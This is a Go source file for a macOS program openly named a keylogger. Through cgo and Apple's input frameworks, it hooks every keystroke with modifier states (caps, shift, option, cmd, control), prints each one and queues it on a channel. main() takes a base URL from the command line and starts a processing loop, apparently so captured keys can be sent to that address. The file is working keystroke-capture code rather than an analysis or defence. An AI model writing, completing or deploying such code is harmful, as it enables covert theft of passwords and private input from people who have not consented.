package main

// #cgo LDFLAGS: -framework ApplicationServices -framework Carbon
// #include "keylogger.h"
// #include <stdlib.h>
import "C"
import (
	"fmt"
	"os"
	"strings"
	"unicode"
	"unsafe"
)

//export handleKeyPress
func handleKeyPress(
	printableRepresentationC *C.char,
	keyCodeC C.int,
	capsC C.bool,
	shiftC C.bool,
	optionC C.bool,
	cmdC C.bool,
	controlC C.bool,
) {
	keyCode := int(keyCodeC)
	caps := bool(capsC)
	shift := bool(shiftC)
	option := bool(optionC)
	cmd := bool(cmdC)
	control := bool(controlC)

	key := C.GoString(printableRepresentationC)
	C.free(unsafe.Pointer(printableRepresentationC))

	key = strings.TrimSpace(key)
	if len(key) == 0 || unicode.IsControl([]rune(key)[0]) {
		key = nonPrintableCharacter(keyCode)
	}
	fmt.Printf("%s, code: %d, caps: %t, shift: %t, option: %t, cmd: %t, control: %t\n",
		key, keyCode, caps, shift, option, cmd, control)
	keyPressesChannel <- KeyPress{
		key:     key,
		keyCode: keyCode,
		caps:    caps,
		shift:   shift,
		option:  option,
		cmd:     cmd,
		control: control,
	}
}

func main() {
	if len(os.Args) > 1 {
		baseUrl = os.Args[1]
	}
	go keyPressesLoop()
	C.start()
}
